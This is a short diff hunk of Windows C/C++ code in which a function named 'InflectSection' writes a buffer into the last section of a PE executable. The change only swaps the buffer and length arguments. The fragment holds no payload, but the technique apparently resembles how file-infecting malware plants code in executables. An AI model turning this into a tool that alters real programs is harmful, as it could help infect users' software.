@@ -294,7 +294,7 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
         order++;
     }
     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
-    WriteFile(hFile, mac, i, &byteWritten, 0);
+    WriteFile(hFile, address, order, &byteWritten, 0);
     CloseHandle(hFile);
     return true;
 }
